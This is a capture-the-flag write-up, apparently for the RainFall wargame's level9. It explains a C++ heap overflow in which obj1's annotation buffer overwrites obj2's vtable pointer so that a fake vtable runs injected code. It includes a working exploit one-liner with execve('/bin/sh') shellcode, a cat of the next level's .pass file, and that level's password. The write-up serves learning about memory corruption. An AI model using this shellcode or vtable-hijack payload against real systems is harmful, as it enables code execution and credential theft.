# level9: C++ Vtable Hijacking

## Challenge Overview

This challenge introduces a C++ program that uses object-oriented programming concepts such as virtual functions and memory management. The goal is to exploit a buffer overflow vulnerability in a way that takes advantage of C++'s vtable mechanism.

## Source Code Analysis

The program is a basic C++ application that defines a class `N` with a virtual function:

```cpp
class N {
public:
    // Constructor initializes an object with a value
    N(int value) {
        *(void ***)this = &vtable;
        *(int *)((char *)this + 104) = value;
    }

    // Copy string to internal buffer - vulnerable function!
    void setAnnotation(char *str) {
        size_t len = strlen(str);
        memcpy((char *)this + 4, str, len);
    }

    // Virtual function that adds values from two objects
    virtual int operator+(N *other) {
        int myValue = this->getValue();
        int otherValue = other->getValue();
        return otherValue + myValue;
    }

    int getValue() {
        return *(int *)((char *)this + 104);
    }

private:
    // Memory layout:
    // Bytes 0-3:   vtable pointer
    // Bytes 4-103: buffer for annotation
    // Bytes 104-107: integer value
    static void *vtable;
};
```

The `main()` function creates two objects and calls the virtual function:

```cpp
int main(int argc, char **argv) {
    if (argc < 2) {
        _exit(1);
    }

    N *obj1 = new N(5);  // First object with value 5
    N *obj2 = new N(6);  // Second object with value 6

    obj1->setAnnotation(argv[1]);  // Copy user input to obj1

    obj2->operator+(obj1);  // Call virtual function on obj2

    return 0;
}
```

## Vulnerability

The vulnerability is in the `setAnnotation()` method:

```cpp
void setAnnotation(char *str) {
    size_t len = strlen(str);
    memcpy((char *)this + 4, str, len);  // No bounds checking!
}
```

This function:

1. Takes a string and measures its length
2. Copies the string to an internal buffer starting at offset 4
3. Does not verify if the string fits within the 100 bytes allocated for the buffer

Since there's no bounds checking, we can provide a string longer than 100 bytes, causing a buffer overflow that can overwrite adjacent memory.

## Exploitation

To exploit this vulnerability, we need to understand C++'s vtable mechanism:

1. **Object Memory Layout**:

   - Each object with virtual functions has a vtable pointer at the beginning
   - The vtable pointer points to a table of function addresses
   - When a virtual function is called, the program looks up its address in the vtable

2. **Memory Organization**:

   - GDB analysis shows obj1 is at address 0x804a00c
   - obj2 is at address 0x804a078 (108 bytes after obj1)
   - When we overflow obj1's buffer, we can overwrite obj2's vtable pointer

3. **Exploit Strategy**:
   - Fill obj1's buffer with our shellcode
   - Place a pointer to our shellcode at the beginning of obj1
   - Overflow obj1 to overwrite obj2's vtable pointer, making it point to obj1
   - When obj2's virtual function is called, it will follow the fake vtable and execute our shellcode

Through GDB debugging, we found that:

- obj1 starts at 0x804a00c
- obj1's buffer starts at 0x804a010 (4 bytes offset)
- obj2's vtable pointer is at 0x804a078
- To overflow from obj1 to obj2, we need exactly 108 bytes

The key insight was that we couldn't just point directly to the shellcode - we needed to create a "fake vtable" structure:

1. At address 0x804a00c: Place the address 0x804a010 (pointing to our shellcode)
2. At address 0x804a010: Place our shellcode
3. Use padding to reach exactly 108 bytes
4. Overwrite obj2's vtable pointer with 0x804a00c (address of our fake vtable)

## Getting the Password

We constructed our exploit string as follows:

```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (108 - 4 - 21) + "\x0c\xa0\x04\x08"')
```

Where:

- `\x10\xa0\x04\x08` is the address of our shellcode (0x804a010)
- The next 21 bytes are the shellcode for `execve("/bin/sh")`
- "A" \* (108 - 4 - 21) bytes of padding to reach obj2's vtable pointer
- `\x0c\xa0\x04\x08` is the address of obj1 (0x804a00c), our fake vtable

This gives us a shell, allowing us to retrieve the password:

```
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Moving to Next Level

Use the password to log in to bonus0:

```bash
level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
bonus0@RainFall:~$
```
